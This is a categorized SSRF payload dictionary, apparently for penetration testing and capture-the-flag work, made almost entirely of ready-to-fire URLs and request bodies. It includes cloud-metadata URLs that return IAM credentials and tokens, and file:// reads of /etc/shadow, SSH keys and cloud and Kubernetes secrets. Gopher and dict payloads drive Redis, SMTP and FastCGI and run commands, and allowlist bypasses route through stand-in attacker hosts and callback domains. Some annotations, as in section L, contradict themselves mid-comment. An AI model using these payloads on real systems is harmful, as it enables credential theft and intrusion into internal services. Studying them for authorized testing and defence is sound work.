# SSRF payload dictionary — the categorized corpus

One URL per line. Grouped by what they DO — pick the family that
matches the evidence, not a random walk.

---

## A. Reachability / first-probe — prove the fetch happens

```text
http://YOUR-CALLBACK/
http://YOUR-CALLBACK/?tag=p1
http://<canary>.<yourdomain>/
https://<canary>.<yourdomain>/
http://127.0.0.1:1/
http://127.0.0.1:2/
http://localhost:1/
http://0.0.0.0:1/
http://nonexistent.invalid./
http://169.254.169.254/
http://example.com/
https://example.com/
```

## B. Loopback — the app's own host

```text
http://127.0.0.1/
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://127.0.0.1:3000/
http://127.0.0.1:5000/
http://127.0.0.1:8000/
http://127.0.0.1:8888/
http://127.0.0.1:9000/
http://127.0.0.1:9001/
http://localhost/
http://localhost:3000/
http://localhost.localdomain/
http://0/
http://0.0.0.0/
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:0:127.0.0.1]/
http://[0:0:0:0:0:ffff:7f00:1]/
http://127.1/
http://127.0.1/
http://127.0.0.1./
http://127.0.0.1:00080/
http://127.0.0.1:0x50/
http://127.0.0.1./
http://0177.0.0.1/
http://0x7f.0.0.1/
http://0x7f000001/
http://2130706433/
http://127.0x1/
http://127.1.0x0.0x0.0x1/
http://127.0o0.0o0.0o1/
http://00127.0.0.1/
http://127.000.000.001/
http://127.0.0.1%20/
http://%20127.0.0.1/
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/
http://lvh.me/
http://vcap.me/
http://ip6-localhost/
http://ip6-loopback/
http://localhost6/
http://spoofer.cable.virginm.net/
```

## C. Internal-name — the guessable hostnames

```text
http://localhost/
http://internal/
http://intranet/
http://intranet.local/
http://admin/
http://admin.internal/
http://backend/
http://backend.internal/
http://api/
http://api.internal/
http://db/
http://db.internal/
http://database/
http://mysql/
http://postgres/
http://mongo/
http://redis/
http://redis.internal/
http://cache/
http://memcached/
http://es/
http://elasticsearch/
http://elastic/
http://kibana/
http://grafana/
http://prometheus/
http://jenkins/
http://gitlab/
http://registry/
http://docker/
http://docker-registry/
http://kubernetes/
http://kubernetes.default/
http://kubernetes.default.svc/
http://kubernetes.default.svc.cluster.local/
http://k8s/
http://consul/
http://etcd/
http://zookeeper/
http://vault/
http://vault.internal/
http://metadata/
http://metadata.google.internal/
http://host.docker.internal/
http://gateway.docker.internal/
http://docker.for.mac.localhost/
http://docker.for.mac.host.internal/
http://service/
http://service.local/
http://internal.local/
http://svc/
http://app/
http://app.internal/
http://web/
http://web.internal/
http://proxy/
http://gateway/
http://router/
http://flag/
http://flag.internal/
http://private/
http://private.internal/
http://dev/
http://dev.internal/
http://staging/
http://test/
http://debug/
http://status/
http://health/
http://worker/
http://queue/
http://mq/
http://rabbitmq/
http://kafka/
http://zoo/
http://minio/
http://s3/
http://s3.internal/
http://ceph/
http://solr/
http://neo4j/
http://arangodb/
http://couchdb/
http://couch/
http://influxdb/
http://influx/
http://chronograf/
http://kapacitor/
http://nexus/
http://harbor/
http://sonarqube/
http://nagios/
http://zabbix/
http://icinga/
http://graphite/
http://splunk/
http://logstash/
http://filebeat/
http://kibana/
http://alertmanager/
http://node-exporter/
http://cadvisor/
http://traefik/
http://envoy/
http://consul-agent/
http://nomad/
http://serf/
http://linkerd/
http://istio/
http://pilot/
http://citadel/
http://galley/
http://zipkin/
http://jaeger/
http://skywalking/
http://pinpoint/
http://sentry/
```

## D. Internal-IP — common private ranges

```text
http://10.0.0.1/
http://10.0.0.2/
http://10.0.0.10/
http://10.0.0.100/
http://10.0.1.1/
http://10.1.0.1/
http://172.16.0.1/
http://172.17.0.1/          — docker-bridge host!
http://172.17.0.2/
http://172.17.0.3/
http://172.18.0.1/
http://172.18.0.2/
http://172.19.0.1/
http://172.20.0.1/
http://192.168.0.1/
http://192.168.1.1/
http://192.168.1.2/
http://192.168.1.100/
http://192.168.49.1/        — minikube
http://192.168.65.1/        — docker-desktop host
http://192.168.65.2/
http://192.168.99.100/      — docker-machine
http://192.168.99.101/
http://169.254.169.254/     — cloud-metadata
http://169.254.170.2/       — ecs-task-metadata
http://100.100.100.200/     — alibaba-metadata
http://169.254.169.250/
http://169.254.169.251/
http://169.254.169.252/
http://169.254.169.253/      — aws-dns
http://169.254.169.249/
http://169.254.169.123/      — aws-ntp?
http://fd00:ec2::254/         — aws-ipv6-metadata
```

## E. Cloud-metadata — the flag-hosts

```text
# aws
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/placement/region
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/mac
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/security-groups
# gcp — needs Metadata-Flavor header — v1beta1 looser
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/startup-script
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env
http://metadata/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1beta1/
# azure — needs Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# digitalocean
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/user-data
# alibaba
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/user-data
# ecs task-metadata
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/metadata/task
# openstack
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack/latest/user_data
# hetzner
http://169.254.169.254/hetzner/v1/userdata
http://169.254.169.254/hetzner/v1/metadata
```

## F. file:// — the filesystem reads

```text
file:///etc/passwd
file:///etc/shadow
file:///flag
file:///flag.txt
file:///FLAG
file:///app/flag
file:///app/flag.txt
file:///root/flag
file:///root/flag.txt
file:///home/ctf/flag
file:///var/www/flag
file:///var/www/html/flag
file:///secret
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd/flag
file:///proc/self/cwd/.env
file:///proc/self/cwd/config.py
file:///proc/self/cwd/app.py
file:///proc/self/cwd/index.js
file:///proc/1/environ
file:///proc/self/maps
file:///proc/self/mountinfo
file:///proc/self/cgroup
file:///proc/net/tcp
file:///proc/net/arp
file:///proc/net/fib_trie
file:///proc/self/status
file:///app/.env
file:///app/config.py
file:///app/config.yml
file:///app/config.json
file:///app/settings.py
file:///app/app.py
file:///app/main.py
file:///app/index.js
file:///app/server.js
file:///app/package.json
file:///app/composer.json
file:///app/requirements.txt
file:///var/www/html/.env
file:///var/www/html/wp-config.php
file:///var/www/html/config.php
file:///var/www/html/index.php
file:///etc/nginx/nginx.conf
file:///etc/nginx/sites-enabled/default
file:///etc/apache2/apache2.conf
file:///etc/apache2/sites-enabled/000-default.conf
file:///etc/hosts
file:///etc/resolv.conf
file:///etc/hostname
file:///etc/environment
file:///etc/os-release
file:///etc/crontab
file:///etc/supervisor/supervisord.conf
file:///etc/supervisor/conf.d/app.conf
file:///etc/docker/daemon.json
file:///root/.bash_history
file:///root/.ssh/id_rsa
file:///root/.aws/credentials
file:///root/.kube/config
file:///home/x/.bash_history
file:///home/ctf/.bash_history
file:///var/log/nginx/access.log
file:///var/log/nginx/error.log
file:///var/log/apache2/access.log
file:///var/log/apache2/error.log
file:///var/log/app.log
file:///var/log/application.log
file:///var/log/supervisor/app-stdout---supervisor-*.log
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/lib/redis/dump.rdb
file:///tmp/sess_*
file:///var/lib/php/sessions/sess_*
file:///var/lib/php5/sessions/sess_*
file:etc/passwd
file:/etc/passwd
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd
file://./etc/passwd
file:////etc/passwd
file:///e:/tc/passwd
FILE:///etc/passwd
File:///etc/passwd
file:///etc/passwd%00
file:///etc/passwd%00.jpg
file:///etc/passwd#x
file:///etc/passwd?x
file:///etc%2fpasswd
file:///%65%74%63/passwd
file:///%2e%2e/etc/passwd
file:///C:/Windows/win.ini
file:///C:/boot.ini
file:///C:/inetpub/wwwroot/web.config
file:///C:/Windows/Panther/Unattend.xml
file:///C:/Windows/repair/SAM
file:///C:/flag.txt
file:///C:/Users/Administrator/Desktop/flag.txt
file://attacker.com/share/x
file:////attacker.com/share/x
```

## G. gopher:// — the raw-TCP shapes

```text
gopher://127.0.0.1:6379/_PING
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_INFO%20server
gopher://127.0.0.1:6379/_KEYS%20*
gopher://127.0.0.1:6379/_GET%20flag
gopher://127.0.0.1:6379/_CONFIG%20GET%20dir
gopher://127.0.0.1:6379/_CONFIG%20GET%20dbfilename
gopher://127.0.0.1:6379/_CONFIG%20GET%20*
gopher://127.0.0.1:6379/_DBSIZE
gopher://127.0.0.1:6379/_CLIENT%20LIST
gopher://127.0.0.1:6379/_TYPE%20flag
gopher://127.0.0.1:6379/_LRANGE%20x%200%20-1
gopher://127.0.0.1:6379/_HGETALL%20x
gopher://127.0.0.1:6379/_SMEMBERS%20x
gopher://127.0.0.1:6379/_EVAL%20%22return%20redis.call%28%27get%27%2C%27flag%27%29%22%200
gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0aPING%0d%0a
gopher://127.0.0.1:6379/_%2a2%0d%0a%244%0d%0aKEYS%0d%0a%241%0d%0a%2a%0d%0a
gopher://127.0.0.1:11211/_stats
gopher://127.0.0.1:11211/_stats%20items
gopher://127.0.0.1:11211/_stats%20cachedump%201%20100
gopher://127.0.0.1:11211/_lru_crawler%20metadump%20all
gopher://127.0.0.1:11211/_version
gopher://127.0.0.1:11211/_get%20flag
gopher://127.0.0.1:25/_HELO%20x%0d%0a
gopher://127.0.0.1:25/_HELO%20x%0d%0aMAIL%20FROM:%3ca@b%3e%0d%0aRCPT%20TO:%3cc@d%3e%0d%0aQUIT%0d%0a
gopher://127.0.0.1:110/_USER%20x%0d%0a
gopher://127.0.0.1:143/_a%20LOGIN%20x%20y%0d%0a
gopher://127.0.0.1:2181/_srvr
gopher://127.0.0.1:2181/_stat
gopher://127.0.0.1:2181/_cons
gopher://127.0.0.1:2181/_dump
gopher://127.0.0.1:2181/_envi
gopher://127.0.0.1:2181/_ruok
gopher://127.0.0.1:10050/_system.uname
gopher://127.0.0.1:10050/_system.run[id]
gopher://127.0.0.1:10050/_vfs.file.contents[/flag]
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20x%0d%0a%0d%0a
gopher://127.0.0.1:80/_GET%20/flag%20HTTP/1.1%0d%0aHost:%20x%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a%0d%0a
gopher://127.0.0.1:443/_GET%20/%20HTTP/1.1%0d%0aHost:%20x%0d%0a%0d%0a
gopher://internal:6379/_PING
gopher://redis:6379/_PING
gopher://memcached:11211/_stats
gopher://db:3306/_x
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%00%00%00
```

## H. dict:// — text-protocol reach

```text
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/KEYS%20*
dict://127.0.0.1:6379/GET%20flag
dict://127.0.0.1:6379/CONFIG%20GET%20dir
dict://127.0.0.1:6379/SET%20x%20y
dict://127.0.0.1:6379/EVAL%20%22return%201%22%200
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/stats%20items
dict://127.0.0.1:11211/get%20flag
dict://127.0.0.1:11211/version
dict://127.0.0.1:25/HELO
dict://127.0.0.1:22/x
dict://redis:6379/INFO
dict://127.0.0.1:6379/d:%24
```

## I. Redirect-based — the validate-then-follow escape

```text
http://YOUR-HOST/302.php?to=http://127.0.0.1/
http://YOUR-HOST/302.php?to=file:///etc/passwd
http://YOUR-HOST/302.php?to=gopher://127.0.0.1:6379/_PING
http://YOUR-HOST/302.php?to=http://169.254.169.254/latest/user-data
http://allowed-domain.com/redir?to=http://127.0.0.1/
http://allowed-domain.com/redirect?url=http://169.254.169.254/
http://allowed-domain.com/out?u=http://internal/
http://allowed-domain.com/goto?url=http://internal/
http://allowed-domain.com/link?target=http://internal/
http://allowed-domain.com/away?to=file:///etc/passwd
```

## J. The `@`/userinfo family — host-confusion

```text
http://allowed.com@127.0.0.1/
http://allowed.com@internal/
http://allowed.com@localhost/
http://allowed.com@169.254.169.254/
http://127.0.0.1@allowed.com/           — reverse — checks-text
http://user@allowed.com@internal/
http://allowed.com:@internal/
http://allowed.com:80@internal/
http://allowed.com\@internal/
http://allowed.com%5c@internal/
http://allowed.com%40@internal/
http://allowed.com#@internal/
http://allowed.com?@internal/
http://allowed.com?.@internal/
http://allowed.com&.@internal/
http://allowed.com\t@internal/
http://allowed.com%09@internal/
http://allowed.com%0a@internal/
http://allowed.com%0d@internal/
http://allowed.com%00@internal/
```

## K. The `#`/`?`-suffix family — allowed-token after terminator

```text
http://127.0.0.1#allowed.com
http://127.0.0.1?allowed.com
http://127.0.0.1#.allowed.com
http://127.0.0.1?.allowed.com
http://127.0.0.1/#/allowed.com
http://internal#allowed.com
http://internal?allowed.com
http://internal/#allowed.com
http://internal/?allowed.com
http://internal/?x=allowed.com
http://internal/x#allowed.com
http://internal/x?allowed.com
```

## L. The suffix-check bypass family

```text
http://allowed.com.evil.com/            — subdomain-of-attacker —
                                          allowed.com INSIDE the name
http://allowed.com.evil.com@internal/
http://internal.allowed.com/            — if the check is endswith —
                                          this IS allowed.com-suffixed
                                          on attacker-DNS → YOUR ip —
                                          no — internal.allowed.com is
                                          your subdomain — resolves
                                          to you — that's the point —
                                          the name PASSES the check AND
                                          you control where it resolves
                                          → resolve it to 127.0.0.1!
http://allowed.com.attacker.com/        — the classic — ends-with-
                                          attacker.com — contains
                                          allowed.com — string-checks
                                          fooled — resolves to attacker
http://attacker-allowed.com/            — contains-token
http://allowed.com@attacker.com/
http://allowed.com%2f@attacker.com/
http://attacker.com#allowed.com
http://attacker.com?allowed.com
http://attacker.com/allowed.com
http://attacker.com/.allowed.com
http://attacker.com%3fallowed.com
http://attacker.com%23allowed.com
http://allowed.com.attacker.com@internal/
http://internal.allowed.com.attacker.com/
```

## M. The port-family — the internal port-sweep payloads

```text
http://127.0.0.1:22/
http://127.0.0.1:25/
http://127.0.0.1:53/
http://127.0.0.1:80/
http://127.0.0.1:110/
http://127.0.0.1:143/
http://127.0.0.1:443/
http://127.0.0.1:445/
http://127.0.0.1:515/
http://127.0.0.1:631/
http://127.0.0.1:2375/
http://127.0.0.1:2376/
http://127.0.0.1:2379/
http://127.0.0.1:2380/
http://127.0.0.1:3000/
http://127.0.0.1:3306/
http://127.0.0.1:4040/
http://127.0.0.1:5000/
http://127.0.0.1:5432/
http://127.0.0.1:5601/
http://127.0.0.1:5672/
http://127.0.0.1:5984/
http://127.0.0.1:6379/
http://127.0.0.1:7001/
http://127.0.0.1:8000/
http://127.0.0.1:8009/
http://127.0.0.1:8025/
http://127.0.0.1:8080/
http://127.0.0.1:8081/
http://127.0.0.1:8086/
http://127.0.0.1:8088/
http://127.0.0.1:8089/
http://127.0.0.1:8161/
http://127.0.0.1:8500/
http://127.0.0.1:8501/
http://127.0.0.1:8888/
http://127.0.0.1:9000/
http://127.0.0.1:9001/
http://127.0.0.1:9090/
http://127.0.0.1:9093/
http://127.0.0.1:9100/
http://127.0.0.1:9200/
http://127.0.0.1:9300/
http://127.0.0.1:9411/
http://127.0.0.1:9990/
http://127.0.0.1:10050/
http://127.0.0.1:11211/
http://127.0.0.1:15672/
http://127.0.0.1:18080/
http://127.0.0.1:27017/
http://127.0.0.1:28017/
http://127.0.0.1:50070/
```

## N. The scheme-family — non-http reaches

```text
file:///etc/passwd
gopher://127.0.0.1:6379/_PING
dict://127.0.0.1:6379/INFO
ftp://127.0.0.1/
ftp://127.0.0.1:21/
sftp://127.0.0.1/
ssh://127.0.0.1/
telnet://127.0.0.1/
tftp://127.0.0.1/x
ldap://127.0.0.1/
ldap://127.0.0.1/dc=x
ldaps://127.0.0.1/
ldapi:///
imap://127.0.0.1/
pop3://127.0.0.1/
smtp://127.0.0.1/
jar:http://internal/x.jar!/x
jar:file:///x.jar!/x
netdoc:///etc/passwd
netdoc:///flag
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=/flag
php://input
expect://id
expect://cat%20/flag
data://text/plain,hi
data://text/plain;base64,aGk=
http+unix://%2fvar%2frun%2fdocker.sock/containers/json
http+unix://%2fvar%2frun%2fdocker.sock/info
ws://127.0.0.1:8080/
wss://internal/
ogg://x
rtsp://x
```

## O. The malformed-URL family — parser differentials

```text
http://127.0.0.1%0d%0a/                  — crlf-in-authority
http://127.0.0.1/%0d%0aHeader:%20x       — crlf-in-path — request-
                                          injection!
http://127.0.0.1%0d%0aHost:%20internal/
http://x%0d%0a%0d%0aGET%20/flag%20HTTP/1.1%0d%0aHost:%20internal/
http://127.0.0.1%00/
http://127.0.0.1%00.evil.com/
http://127.0.0.1\x00/
http://\t127.0.0.1/
http://127.0.0.1\t/
http://127.0.0.1\n/
http://127.0.0.1\r/
http://127.0.0.1 /
http://127.0.0.1%20/
http://%20127.0.0.1/
http://127.0.0.1. /
http://127.0.0.1./
http://127.0.0.1../
http://127.0.0.1.../
http://127.0.0.1;/
http://127.0.0.1:80/../
http://127.0.0.1/../..//
http:///127.0.0.1/
http:/127.0.0.1/
http:127.0.0.1/
http//127.0.0.1/
http:\\127.0.0.1/
http:\\\127.0.0.1/
http:/\127.0.0.1/
http:\127.0.0.1/
http:/\\/127.0.0.1/
http：//127.0.0.1/                        — fullwidth-colon
http：／／127.0.0.1/
http：\u002f\u002f127.0.0.1/
HTTP://127.0.0.1/
HtTp://127.0.0.1/
httpS://127.0.0.1:443/
HtTpS://127.0.0.1/
```

## P. The DNS-rebind payloads — resolve-twice

```text
http://<rbndr-tag>.rbndr.us/            — the public rebind service —
                                        alternates A-records — needs
                                        the service reachable
http://<tag>.<your-rebind-domain>/       — your own split-horizon DNS —
                                        TTL=0, alternating answers
http://<tag>.nip.io/                     — resolves to the tag-ip —
                                          not a rebind — a name-for-ip
http://7f000001.<yourdomain>/            — your DNS answers 127.0.0.1 —
                                          the check sees a hostname
http://internal.<yourdomain>/            — your DNS → internal-ip —
                                          the hostname-shape for an
                                          internal-address
```

## Q. The JSON/field payloads — when the param isn't `url=`

```text
{"url":"http://127.0.0.1/"}               — json-body
{"target":"http://internal/"}
{"feed":"file:///etc/passwd"}
{"image_url":"http://169.254.169.254/"}
{"avatar":"http://internal/"}
{"callback":"http://YOUR/"}
{"webhook":"http://YOUR/"}
{"fetch":"gopher://127.0.0.1:6379/_PING"}
{"import_url":"file:///etc/passwd"}
{"source":"http://internal/"}
{"dest":"http://internal/"}
{"path":"file:///etc/passwd"}
{"file":"file:///etc/passwd"}
{"host":"internal","port":6379}
{"host":"127.0.0.1","port":6379,"scheme":"gopher"}
{"host":{"$gt":""}…}                     — nosql-ish — not ssrf
url=http://127.0.0.1/&url=http://x/      — param-duplication —
                                          which one wins?
url[]=http://127.0.0.1/                  — array-param
url[0]=http://internal/
url.host=internal&url.port=6379           — object-param — rails/php
url[host]=internal&url[port]=6379
url.scheme=gopher&url.host=127.0.0.1&url.port=6379
```

## R. The double-fetch tricks — a URL inside a URL

```text
url=http://app/proxy?u=http://internal/   — the app's own proxy-route
                                            — SSRF-inside-SSRF —
                                            second hop may lack the
                                            filter
url=http://app/fetch?url=file:///etc/passwd
url=http://internal/redirect?to=file:///x — the internal-service's
                                            redirect → chained-fetch
```

## S. The timing/dns-canary payloads — the measure-not-read

```text
http://p1.<id>.yourdomain/
http://p2.<id>.yourdomain/
http://canary.<id>.yourdomain/
http://<id>.burpcollaborator.net/
http://<id>.oast.site/
http://<id>.oastify.com/
http://<id>.oast.pro/
http://<id>.dnslog.cn/
http://<id>.requestbin.net/
http://<id>.webhook.site/
```

## T. The mutate-and-resend families — single-param diffing

```text
url=127.0.0.1          — no-scheme — parser-assumes-http?
url=//127.0.0.1         — scheme-relative
url=///127.0.0.1
url=\\127.0.0.1          — backslash-authority
url=127.0.0.1:6379
url=http:127.0.0.1
url=http:/127.0.0.1
url=http:///127.0.0.1
url=127.0.0.1/
url=localhost
url=internal
url=internal:6379
url=file:/etc/passwd
url=file:///etc/passwd
url=gopher://127.0.0.1:6379/_PING
url=/etc/passwd          — relative-path — the fetcher may resolve
                           against a base — or read-local
url=../etc/passwd
url=....//etc/passwd
url=%2fetc%2fpasswd
url=%252fetc%252fpasswd
```
